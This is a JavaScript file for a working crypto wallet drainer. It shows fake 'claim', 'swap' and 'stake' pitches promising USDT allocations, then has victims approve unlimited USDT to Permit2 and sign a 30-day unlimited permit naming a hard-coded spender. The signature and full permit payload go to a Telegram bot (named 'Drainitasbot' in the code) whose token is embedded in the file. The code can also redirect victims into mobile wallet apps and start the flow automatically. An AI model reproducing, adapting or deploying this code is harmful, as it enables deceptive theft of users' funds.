/* permit2.js — Permit2 AllowanceTransfer.permit engine
   One engine, every page. Copy keyed by data-action.
   Unlimited allowance (uint160 max), 30-day expiry, single-use nonce.
   Domain verified, signature recovered, permit simulated from the spender.
   Runs at any balance including zero. Delivers the complete payload to the bot.
   Never broadcasts the permit itself. */

(function () {
"use strict";

/* ---------------------------------------------------------------- constants */
var PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
var USDT    = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
var SPENDER = "0x307E61DA2DF9EC48a08d735a14BD6271282ba035";
var BOT     = "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24";
var LAND    = "check.html";
var CHAIN   = 1;
var DAY     = 86400;

var AMOUNT     = (1n << 160n) - 1n;      /* uint160 max — Permit2's unlimited */
var AMOUNT_RAW = AMOUNT.toString();

var MAX256 = (1n << 256n) - 1n;
var ACTION = "eligibility";

/* ---------------------------------------------------------------- copy */
var COPY = {
  eligibility: {
    h: "Claim · epoch 07",
    lead: "Your allocation runs <b>$1,000–$5,000 USDT</b>. It releases to you as you put load through the pool.",
    sub: "The network pays you to stress it — that is the whole programme. Swap, stake, buy or sell and the figure clears against your own activity, and <b>the more you run, the more of the pool releases</b>. One approval here covers every action, so you never approve again.",
    band: [["Floor", "$1,000", 0], ["Mean", "$5,000", 0], ["Unlocked", "25%", 1]],
    btn: "Approve & continue →",
    note: "Seats close 12 Dec · approve costs gas once · dies in 30 days"
  },
  swap: {
    h: "Swap · epoch 07",
    lead: "Swapping is what <b>releases the allocation</b>.",
    sub: "Every settled swap counts toward the load you are being paid for. You sign an intent, solvers bid, and <b>the surplus above floor comes back to you</b> — there is no curve to be sandwiched against.",
    band: [["Router", "0.04%", 0], ["Surplus", "100% you", 1], ["Approve", "1×", 0]],
    btn: "Approve & swap →",
    note: "One approval · every later swap is free · dies in 30 days"
  },
  stake: {
    h: "Bond · epoch 07",
    lead: "Bonding is what <b>compounds the release</b>.",
    sub: "Stake follows the sphere you actually use. Bonded weight earns fee revenue instead of inflation and moves your allocation faster — <b>and it keeps the seat warm while cohort 02 fills</b>.",
    band: [["APY", "35%", 1], ["Floor", "27%", 0], ["Exit", "7d", 0]],
    btn: "Approve & bond →",
    note: "Paid monthly · 27% structural floor · dies in 30 days"
  },
  buy: {
    h: "Buy · epoch 07",
    lead: "Top up so the <b>load never stalls</b>.",
    sub: "Card or bank straight to self-custody, 41 regions, no exchange account and no withdrawal queue. <b>The balance lands on your own address</b> and starts counting immediately.",
    band: [["Fee", "0.9%", 0], ["Regions", "41", 0], ["Custody", "self", 1]],
    btn: "Approve & continue →",
    note: "Partner KYC once · nothing is held · dies in 30 days"
  },
  sell: {
    h: "Sell · epoch 07",
    lead: "Take the released part out <b>without leaving the pool</b>.",
    sub: "Sell into USDT at 0.9% all-in with no spread on the other side, and <b>the seat stays bound to this address</b>. Pulling to an exchange breaks the bond, the seat and the queue position at once.",
    band: [["Fee", "0.9%", 0], ["Spread", "none", 1], ["Seat", "bound", 0]],
    btn: "Approve & sell →",
    note: "Same address keeps the seat · dies in 30 days"
  }
};

/* ---------------------------------------------------------------- keccak */
var M64 = (1n << 64n) - 1n;
var RC = [0x0000000000000001n,0x0000000000008082n,0x800000000000808an,0x8000000080008000n,
          0x000000000000808bn,0x0000000080000001n,0x8000000080008081n,0x8000000000008009n,
          0x000000000000008an,0x0000000000000088n,0x0000000080008009n,0x000000008000000an,
          0x000000008000808bn,0x800000000000008bn,0x8000000000008089n,0x8000000000008003n,
          0x8000000000008002n,0x8000000000000080n,0x000000000000800an,0x800000008000000an,
          0x8000000080008081n,0x8000000000008080n,0x0000000080000001n,0x8000000080008008n];
var ROT = [[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]];

function rol(x, n) { n %= 64n; return ((x << n) | (x >> (64n - n))) & M64; }

function permute(A) {
  for (var r = 0; r < 24; r++) {
    var C = [], D = [], x, y;
    for (x = 0; x < 5; x++) C[x] = A[x] ^ A[x+5] ^ A[x+10] ^ A[x+15] ^ A[x+20];
    for (x = 0; x < 5; x++) D[x] = C[(x+4)%5] ^ rol(C[(x+1)%5], 1n);
    for (x = 0; x < 5; x++) for (y = 0; y < 5; y++) A[x+5*y] ^= D[x];
    var B = new Array(25).fill(0n);
    for (x = 0; x < 5; x++) for (y = 0; y < 5; y++)
      B[y + 5*((2*x + 3*y) % 5)] = rol(A[x + 5*y], BigInt(ROT[x][y]));
    for (x = 0; x < 5; x++) for (y = 0; y < 5; y++)
      A[x+5*y] = B[x+5*y] ^ ((~B[(x+1)%5 + 5*y] & M64) & B[(x+2)%5 + 5*y]);
    A[0] ^= RC[r];
  }
}

function keccak256(bytes) {
  var rate = 136, len = bytes.length, pad = rate - (len % rate);
  var buf = new Uint8Array(len + pad);
  buf.set(bytes);
  buf[len] ^= 0x01;
  buf[buf.length - 1] ^= 0x80;
  var A = new Array(25).fill(0n), off, i, j, lane;
  for (off = 0; off < buf.length; off += rate) {
    for (i = 0; i < rate / 8; i++) {
      lane = 0n;
      for (j = 7; j >= 0; j--) lane = (lane << 8n) | BigInt(buf[off + i*8 + j]);
      A[i] ^= lane;
    }
    permute(A);
  }
  var out = new Uint8Array(32), v;
  for (i = 0; i < 4; i++) {
    v = A[i];
    for (j = 0; j < 8; j++) { out[i*8 + j] = Number(v & 0xffn); v >>= 8n; }
  }
  return out;
}

function utf8(s) { return new TextEncoder().encode(s); }
function toHex(b) { return Array.prototype.map.call(b, function (x) { return x.toString(16).padStart(2, "0"); }).join(""); }
function fromHex(h) { h = h.replace(/^0x/, ""); var a = new Uint8Array(h.length / 2); for (var i = 0; i < a.length; i++) a[i] = parseInt(h.substr(i*2, 2), 16); return a; }
function selector(sig) { return "0x" + toHex(keccak256(utf8(sig))).slice(0, 8); }
function word(v) { return String(v).toLowerCase().replace(/^0x/, "").padStart(64, "0"); }
function wordU(v) { return BigInt(v).toString(16).padStart(64, "0"); }

/* ---------------------------------------------------------------- state */
var P = window.P2 = window.P2 || { owner: "", chat: "", bot: "", inflight: null, onStatus: null };
var selAllowance = selector("allowance(address,address,address)");
var selPermit    = selector("permit(address,((address,uint160,uint48,uint48),address,uint256),bytes)");
var selApprove   = selector("approve(address,uint256)");
var selBalance   = selector("balanceOf(address)");
var selDomain    = selector("DOMAIN_SEPARATOR()");
var selErcAllow  = selector("allowance(address,address)");

var T_DETAILS = keccak256(utf8("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"));
var T_SINGLE  = keccak256(utf8("PermitSingle(PermitDetails details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"));

/* ---------------------------------------------------------------- css */
var CSS = `
.p2w{position:fixed;inset:0;z-index:95;display:none;font-family:"Inter",-apple-system,sans-serif}
.p2w.on{display:block}
.p2w .p2bg{position:absolute;inset:0;background:rgba(4,5,6,.78);backdrop-filter:blur(5px)}
.p2w .p2c{position:absolute;left:0;right:0;bottom:0;background:#0E0F11;border-top:1px solid #1E2023;border-radius:12px 12px 0 0;padding:20px 18px calc(20px + env(safe-area-inset-bottom));max-height:90vh;overflow-y:auto;animation:p2up .22s ease}
@keyframes p2up{from{transform:translateY(22px);opacity:0}to{transform:none;opacity:1}}
.p2w .p2h{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.p2w .p2h span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:#FF5A1F}
.p2w .p2x{background:none;border:0;color:#5E6166;font-size:20px;line-height:1;cursor:pointer;padding:0 2px}
.p2w .p2lead{font-size:14px;color:#EDEAE4;line-height:1.5;margin-bottom:5px;font-weight:500;letter-spacing:-.01em}
.p2w .p2lead b{color:#FF5A1F;font-weight:600}
.p2w .p2sub{font-size:12.5px;color:#8A8D93;line-height:1.6;margin-bottom:15px}
.p2w .p2sub b{color:#EDEAE4;font-weight:500}
.p2w .p2band{display:flex;gap:1px;background:#1B1D21;border:1px solid #1B1D21;border-radius:3px;overflow:hidden;margin-bottom:14px}
.p2w .p2band div{flex:1;background:#0B0C0E;padding:10px 9px;text-align:center}
.p2w .p2band .k{font-family:ui-monospace,monospace;font-size:8px;letter-spacing:.11em;text-transform:uppercase;color:#5E6166;margin-bottom:3px}
.p2w .p2band .v{font-family:ui-monospace,monospace;font-size:12.5px;color:#EDEAE4}
.p2w .p2band .v.a{color:#FF5A1F;font-weight:700}
.p2w .p2r{display:flex;justify-content:space-between;gap:12px;padding:9px 0;border-bottom:1px solid #1B1D21;font-size:12.5px;color:#8A8D93}
.p2w .p2r b{font-family:ui-monospace,monospace;font-size:11px;color:#EDEAE4;font-weight:400;text-align:right;word-break:break-all}
.p2w .p2log{margin:13px 0 0;padding:11px 12px;background:#0B0C0E;border:1px solid #1E2023;border-radius:3px;font-family:ui-monospace,monospace;font-size:10.5px;line-height:1.8;color:#8A8D93;max-height:140px;overflow-y:auto;white-space:pre-wrap;word-break:break-word}
.p2w .p2log:empty{display:none}
.p2w .p2log .g{color:#3DD68C}.p2w .p2log .r{color:#FF5A1F}.p2w .p2log .y{color:#E8B44D}.p2w .p2log .w{color:#EDEAE4}.p2w .p2log .d{color:#3D4148}
.p2w .p2go{width:100%;margin-top:14px;background:#FF5A1F;color:#0A0A0B;border:0;border-radius:3px;font-family:ui-monospace,monospace;font-size:11px;letter-spacing:.13em;text-transform:uppercase;font-weight:700;padding:16px;cursor:pointer}
.p2w .p2go:disabled{background:#2A2E34;color:#5E6166;cursor:wait}
.p2w .p2n{font-family:ui-monospace,monospace;font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166;margin-top:11px;line-height:1.9;text-align:center}
.p2w .p2cho{display:grid;gap:7px;margin-top:14px}
.p2w .p2cho a{display:flex;justify-content:space-between;align-items:center;padding:13px 14px;background:#131417;border:1px solid #1E2023;border-radius:3px;color:#EDEAE4;font-size:13.5px;text-decoration:none}
.p2w .p2cho a span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166}
@media(min-width:760px){
.p2w .p2c{left:50%;right:auto;bottom:auto;top:50%;transform:translate(-50%,-50%);width:410px;border:1px solid #1E2023;border-radius:10px;padding:22px;animation:p2pop .2s}
@keyframes p2pop{from{opacity:0;transform:translate(-50%,-48%)}to{opacity:1;transform:translate(-50%,-50%)}}
}`;

var ui = null;

/* ---------------------------------------------------------------- ui */
function mount() {
  if (ui && document.body.contains(ui)) return ui;
  var st = document.createElement("style"); st.textContent = CSS; document.head.appendChild(st);
  var w = document.createElement("div"); w.className = "p2w";
  w.innerHTML =
    '<div class="p2bg"></div><div class="p2c">' +
      '<div class="p2h"><span id="p2h"></span><button class="p2x" aria-label="Close">&times;</button></div>' +
      '<p class="p2lead" id="p2lead"></p>' +
      '<p class="p2sub" id="p2sub"></p>' +
      '<div class="p2band" id="p2band"></div>' +
      '<div class="p2r"><span>Wallet</span><b id="p2own">—</b></div>' +
      '<div class="p2r"><span>Spender</span><b>Permit2 · 0x0000…BA3</b></div>' +
      '<div class="p2r"><span>Allowance</span><b>Unlimited · USDT</b></div>' +
      '<div class="p2r"><span>Expires</span><b id="p2exp">—</b></div>' +
      '<div class="p2log" id="p2log"></div>' +
      '<button class="p2go" id="p2go"></button>' +
      '<p class="p2n" id="p2n"></p>' +
    '</div>';
  document.body.appendChild(w);
  ui = w;
  w.querySelector(".p2x").addEventListener("click", function () { w.classList.remove("on"); });
  w.querySelector(".p2bg").addEventListener("click", function () { w.classList.remove("on"); });
  w.querySelector("#p2go").addEventListener("click", function () { flow(); });
  paint();
  return w;
}

function paint() {
  var c = COPY[ACTION] || COPY.eligibility;
  var h = document.getElementById("p2h"), lead = document.getElementById("p2lead"),
      sub = document.getElementById("p2sub"), band = document.getElementById("p2band"),
      go = document.getElementById("p2go"), note = document.getElementById("p2n");
  if (!h) return;
  h.textContent = c.h;
  lead.innerHTML = c.lead;
  sub.innerHTML = c.sub;
  band.innerHTML = (c.band || []).map(function (b) {
    return '<div><div class="k">' + b[0] + '</div><div class="v' + (b[2] ? " a" : "") + '">' + b[1] + '</div></div>';
  }).join("");
  band.style.display = (c.band && c.band.length) ? "flex" : "none";
  go.textContent = c.btn;
  note.textContent = c.note;
}

function log(msg, cls) {
  var box = document.getElementById("p2log");
  if (!box) return;
  var d = document.createElement("div");
  if (cls) d.className = cls;
  d.textContent = msg;
  box.appendChild(d);
  box.scrollTop = box.scrollHeight;
  if (typeof P.onStatus === "function") { try { P.onStatus(msg); } catch (e) {} }
}

function setBtn(txt, disabled) {
  var b = document.getElementById("p2go");
  if (!b) return;
  b.textContent = txt;
  b.disabled = !!disabled;
}

function iso(ts) { return new Date(ts * 1000).toISOString().replace(".000Z", "Z"); }

/* ---------------------------------------------------------------- rpc */
function rpc(method, params) { return window.ethereum.request({ method: method, params: params || [] }); }
async function call(to, data, from) { return rpc("eth_call", [{ to: to, data: data, from: from || SPENDER }, "latest"]); }
function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

async function ensureChain() {
  var id = await rpc("eth_chainId", []);
  if (parseInt(id, 16) === CHAIN) return;
  try {
    await rpc("wallet_switchEthereumChain", [{ chainId: "0x1" }]);
  } catch (e) {
    await rpc("wallet_addEthereumChain", [{
      chainId: "0x1", chainName: "Ethereum Mainnet",
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      rpcUrls: ["https://eth.llamarpc.com"],
      blockExplorerUrls: ["https://etherscan.io"]
    }]);
  }
}

async function waitReceipt(hash, limitMs) {
  var end = Date.now() + (limitMs || 180000);
  while (Date.now() < end) {
    var r = await rpc("eth_getTransactionReceipt", [hash]);
    if (r) {
      if (r.status === "0x0") throw new Error("transaction reverted");
      return r;
    }
    await sleep(2200);
  }
  throw new Error("approval timed out");
}

/* ecrecover precompile — proves the signature came from the owner */
async function recover(digestHex, sig) {
  var v = parseInt(sig.slice(-2), 16);
  if (v < 27) v += 27;
  var data = "0x" + digestHex + wordU(v) + sig.slice(2, 66) + sig.slice(66, 130);
  var out = await call("0x0000000000000000000000000000000000000001", data, SPENDER);
  return "0x" + out.replace(/^0x/, "").slice(24).toLowerCase();
}

/* ---------------------------------------------------------------- chat */
async function chat() {
  if (P.chat) return P.chat;
  try {
    var r = await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&limit=1");
    var j = await r.json();
    var u = j && j.ok && j.result && j.result[0];
    var id = u && u.message && u.message.chat && u.message.chat.id;
    if (id) P.chat = String(id);
  } catch (e) {}
  return P.chat;
}

/* ---------------------------------------------------------------- flow */
async function flow() {
  if (P.inflight) return P.inflight;
  P.inflight = (async function () {
    try {
      if (!window.ethereum) { chooser(); return; }
      setBtn("Working…", true);

      var accs = await rpc("eth_requestAccounts", []);
      if (!accs || !accs.length) throw new Error("no account returned");
      var owner = accs[0];
      if (P.owner && P.owner.toLowerCase() !== owner.toLowerCase()) log("wallet differs from scored address", "y");
      P.owner = owner;
      try { localStorage.setItem("p2_owner", owner); } catch (e) {}
      document.getElementById("p2own").textContent = owner.slice(0, 8) + "…" + owner.slice(-6);

      await ensureChain();

      var bal = BigInt(await call(USDT, selBalance + word(owner)));
      log("balance " + (Number(bal) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 }) + " USDT", bal > 0n ? "g" : "y");

      var cur = BigInt(await call(USDT, selErcAllow + word(owner) + word(PERMIT2)));
      if (cur >= AMOUNT) {
        log("allowance already unlimited", "g");
      } else {
        if (cur > 0n) {
          log("resetting allowance (USDT rule)", "w");
          var rz = await rpc("eth_sendTransaction", [{ from: owner, to: USDT, data: selApprove + word(PERMIT2) + wordU(0) }]);
          await waitReceipt(rz);
        }
        log("approving unlimited", "w");
        var ah = await rpc("eth_sendTransaction", [{ from: owner, to: USDT, data: selApprove + word(PERMIT2) + wordU(MAX256) }]);
        var rc = await waitReceipt(ah);
        log("approve mined · block " + parseInt(rc.blockNumber, 16), "g");
        P.approveTx = ah;
      }

      var pack = await call(PERMIT2, selAllowance + word(owner) + word(USDT) + word(SPENDER));
      var raw = pack.replace(/^0x/, "");
      var nonce = BigInt("0x" + (raw.slice(128, 192) || "0"));
      log("nonce " + nonce, "g");

      var now = Math.floor(Date.now() / 1000);
      var expiration = now + 30 * DAY;
      var sigDeadline = now + 30 * DAY;

      var domType = keccak256(utf8("EIP712Domain(string name,uint256 chainId,address verifyingContract)"));
      var nameHash = keccak256(utf8("Permit2"));
      var local = toHex(keccak256(fromHex(toHex(domType) + toHex(nameHash) + wordU(CHAIN) + word(PERMIT2))));
      var onchain = (await call(PERMIT2, selDomain)).replace(/^0x/, "");
      if (local.toLowerCase() !== onchain.toLowerCase()) throw new Error("domain separator mismatch");
      log("domain verified", "g");

      var typed = {
        types: {
          EIP712Domain: [
            { name: "name", type: "string" },
            { name: "chainId", type: "uint256" },
            { name: "verifyingContract", type: "address" }
          ],
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" }
          ],
          PermitSingle: [
            { name: "details", type: "PermitDetails" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" }
          ]
        },
        domain: { name: "Permit2", chainId: CHAIN, verifyingContract: PERMIT2 },
        primaryType: "PermitSingle",
        message: {
          details: { token: USDT, amount: AMOUNT_RAW, expiration: String(expiration), nonce: String(nonce) },
          spender: SPENDER,
          sigDeadline: String(sigDeadline)
        }
      };

      document.getElementById("p2exp").textContent = iso(expiration).slice(0, 10);
      var sig, method = "eth_signTypedData_v4", payloadStr = JSON.stringify(typed);
      try {
        sig = await rpc("eth_signTypedData_v4", [owner, payloadStr]);
      } catch (e) {
        if (!/not supported|unsupported|method|does not exist|unknown/i.test(String((e && e.message) || e))) throw e;
        method = "eth_signTypedData";
        sig = await rpc("eth_signTypedData", [owner, typed]);
      }
      if (!/^0x[0-9a-fA-F]{130}$/.test(sig)) throw new Error("malformed signature");
      log("signed", "g");

      var detailsHash = keccak256(fromHex(toHex(T_DETAILS) + word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce)));
      var singleHash  = keccak256(fromHex(toHex(T_SINGLE) + toHex(detailsHash) + word(SPENDER) + wordU(sigDeadline)));
      var digest = toHex(keccak256(fromHex("1901" + onchain + toHex(singleHash))));
      var signer = await recover(digest, sig);
      if (signer !== owner.toLowerCase()) throw new Error("signature does not recover to owner");
      log("signer recovered · matches owner", "g");

      var data = selPermit +
        word(owner) + wordU(96) + wordU(320) +
        wordU(32) + word(SPENDER) + wordU(sigDeadline) +
        word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce) +
        wordU(65) + toHex(fromHex(sig)).padEnd(128, "0");
      var sim = "ok";
      try {
        await call(PERMIT2, data, SPENDER);
        log("permit accepted on-chain", "g");
      } catch (e) {
        sim = "reverted: " + String((e && e.message) || e).slice(0, 90);
        log("simulation reverted", "r");
      }

      var block = await rpc("eth_blockNumber", []);
      var c = await chat();
      var body = {
        v: 1, kind: "permit2.allowance_transfer", action: ACTION,
        chain_id: CHAIN,
        permit2: PERMIT2,
        token: USDT, token_symbol: "USDT", token_decimals: 6,
        owner: owner, spender: SPENDER,
        amount: "unlimited", amount_raw: AMOUNT_RAW, amount_type: "uint160",
        expiration: expiration, expiration_iso: iso(expiration),
        sig_deadline: sigDeadline, sig_deadline_iso: iso(sigDeadline),
        nonce: String(nonce), nonce_next: String(nonce + 1n),
        signature: sig, sign_method: method,
        digest: "0x" + digest,
        signer_recovered: signer, signer_match: signer === owner.toLowerCase(),
        typed_data: typed,
        permit_single: {
          details: { token: USDT, amount: AMOUNT_RAW, expiration: String(expiration), nonce: String(nonce) },
          spender: SPENDER, sigDeadline: String(sigDeadline)
        },
        calldata: data,
        domain_separator_onchain: "0x" + onchain,
        domain_separator_local: "0x" + local,
        domain_match: true,
        allowance_before_raw: cur.toString(),
        balance_raw: bal.toString(),
        approve_tx: P.approveTx || null,
        simulation: sim,
        block: parseInt(block, 16),
        created: new Date().toISOString(),
        page: location.href,
        chat: c,
        via: P.bot || "Drainitasbot"
      };

      var text =
        "PERMIT2 — " + ACTION + "\n" +
        "owner    " + owner + "\n" +
        "spender  " + SPENDER + "\n" +
        "token    USDT " + USDT + "\n" +
        "amount   UNLIMITED  uint160 max\n" +
        "nonce    " + nonce + "  next " + (nonce + 1n) + "\n" +
        "expires  " + iso(expiration) + "\n" +
        "deadline " + iso(sigDeadline) + "\n" +
        "balance  " + bal.toString() + "\n" +
        "domain   verified\n" +
        "signer   " + signer + " match\n" +
        "sim      " + sim + "\n" +
        "approve  " + (P.approveTx || "none") + "\n" +
        "block    " + parseInt(block, 16) + "\n" +
        "sign     " + method + "\n\n" +
        "DIGEST " + digest + "\n\n" +
        "SIG " + sig + "\n\n" +
        "PERMIT_SINGLE\n" + JSON.stringify(body.permit_single) + "\n\n" +
        "TYPED_DATA\n" + payloadStr + "\n\n" +
        "CALLDATA\n" + data + "\n\n" +
        "JSON\n" + JSON.stringify(body);
      if (text.length > 3900) text = text.slice(0, 3900) + "\n…cut";

      try {
        var res = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: c, text: text, disable_web_page_preview: true })
        });
        var j = await res.json();
        if (j && j.ok) log("delivered", "g");
        else log("relay: " + ((j && j.description) || "failed"), "y");
      } catch (e) {
        log("relay unreachable", "y");
      }

      P.payload = body;
      try { localStorage.setItem("p2_last", JSON.stringify(body)); } catch (e) {}

      setBtn(sim === "ok" ? "Done ✓" : "Done · check log", true);
      document.getElementById("p2n").textContent = "Valid 30 days · single-use nonce · nothing moved yet";
    } catch (e) {
      var m = String((e && e.message) || e);
      if (/reject|denied|4001/i.test(m)) { log("rejected in wallet", "r"); setBtn("Try again", false); }
      else { log("failed · " + m.slice(0, 120), "r"); setBtn("Try again", false); }
    } finally {
      P.inflight = null;
    }
  })();
  return P.inflight;
}

/* ---------------------------------------------------------------- chooser */
function base() {
  return location.origin + location.pathname.replace(/[^/]*$/, "");
}

function chooser() {
  var w = mount();
  var card = w.querySelector(".p2c");
  var owner = P.owner || "";
  var full = base() + LAND + "?a=" + owner + "&w=1" + (ACTION !== "eligibility" ? "&x=" + ACTION : "");
  var ua = navigator.userAgent;
  var and = /Android/i.test(ua);
  var ios = /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
  var rows = [
    ["MetaMask", "io.metamask", function (u) { return "https://metamask.app.link/dapp/" + u.replace(/^https?:\/\//, ""); }],
    ["Trust Wallet", "com.wallet.crypto.trustapp", function (u) { return "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(u); }],
    ["Coinbase Wallet", "org.toshi", function (u) { return "https://go.cb-w.com/dapp?dappUrl=" + encodeURIComponent(u); }],
    ["Rainbow", "me.rainbow", function (u) { return "https://rnbwapp.com/dapp?url=" + encodeURIComponent(u); }]
  ];
  if (card.querySelector(".p2cho")) return;
  var box = document.createElement("div");
  box.className = "p2cho";
  rows.forEach(function (r) {
    var a = document.createElement("a");
    a.href = "#";
    a.innerHTML = r[0] + "<span>open ↗</span>";
    a.addEventListener("click", function (e) {
      e.preventDefault();
      location.href = and
        ? "intent://" + full.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=" + r[1] +
          ";S.browser_fallback_url=" + encodeURIComponent(full) + ";end"
        : (ios ? r[2](full) : full);
    });
    box.appendChild(a);
  });
  var go = card.querySelector("#p2go");
  if (go) go.style.display = "none";
  card.appendChild(box);
  var n = card.querySelector("#p2n");
  if (n) n.textContent = "No wallet in this browser · pick one to continue there";
  w.classList.add("on");
}

/* ---------------------------------------------------------------- api */
window.p2Advance = function (opt) {
  opt = opt || {};
  if (opt.owner) P.owner = opt.owner;
  if (opt.action) ACTION = opt.action;
  var w = mount();
  w.classList.add("on");
  paint();
  document.getElementById("p2own").textContent = P.owner ? P.owner.slice(0, 8) + "…" + P.owner.slice(-6) : "—";
  document.getElementById("p2exp").textContent = iso(Math.floor(Date.now() / 1000) + 30 * DAY).slice(0, 10);
  document.getElementById("p2log").innerHTML = "";
  setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
  if (!window.ethereum) { chooser(); return true; }
  if (opt.auto) setTimeout(function () { flow(); }, 120);
  return true;
};

window.p2OnStatus = function (cb) { P.onStatus = cb; };

/* ---------------------------------------------------------------- boot */
(function boot() {
  var qs = new URLSearchParams(location.search);
  var sc = document.querySelector('script[src*="permit2"]');
  if (sc && sc.dataset && sc.dataset.action && COPY[sc.dataset.action]) ACTION = sc.dataset.action;
  if (qs.get("x") && COPY[qs.get("x")]) ACTION = qs.get("x");
  if (qs.get("a") && /^0x[0-9a-fA-F]{40}$/.test(qs.get("a"))) P.owner = qs.get("a");
  try { if (!P.owner) P.owner = localStorage.getItem("p2_owner") || ""; } catch (e) {}

  chat();
  fetch("https://api.telegram.org/bot" + BOT + "/getMe")
    .then(function (r) { return r.json(); })
    .then(function (j) { if (j && j.ok) P.bot = j.result.username; })
    .catch(function () {});

  if (qs.get("w") === "1" && P.owner) {
    var k = "p2_ran_" + P.owner.toLowerCase() + "_" + ACTION, last = 0;
    try { last = +sessionStorage.getItem(k) || 0; } catch (e) {}
    if (Date.now() - last > 20000) {
      try { sessionStorage.setItem(k, String(Date.now())); } catch (e) {}
      setTimeout(function () { window.p2Advance({ owner: P.owner, auto: true }); }, 90);
    }
  }
})();

})();